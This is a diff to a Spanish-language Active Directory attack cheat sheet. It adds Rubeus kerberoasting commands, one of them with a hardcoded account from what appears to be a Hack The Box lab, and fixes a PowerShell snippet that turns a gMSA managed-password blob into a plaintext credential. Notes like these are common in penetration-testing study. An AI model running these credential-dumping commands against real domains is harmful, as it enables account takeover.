@@ -1,4 +1,4 @@
-# Atacando Active Directory
+# Atacando Active Directory <!-- omit from toc -->
 
 ## Tabla de Contenido <!-- omit from toc -->
 
@@ -340,7 +340,8 @@ Kerberos in a nutshell:
 Haciendo uso de:
 
 ```powershell
-Rubeus.exe kerberoast
+Rubeus.exe kerberoast # Como Administrator
+Rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Password123
 ```
 
 Se permite el dumpeo de los usuarios aplicables.
@@ -645,7 +646,7 @@ ConvertFrom-ADManagedPasswordBlob $mp
 # Alterantive: build a Credential-Object with the Plain Password
 $cred = new-object system.management.automation.PSCredential "Domain\Target_Account",(ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword
 # Visualizar la contraseña en texto claro
-ConvertTo-SecureString $passwd -AsPlainText -Force
+ConvertTo-SecureString $mp -AsPlainText -Force
 ```
 
 ## Referencias
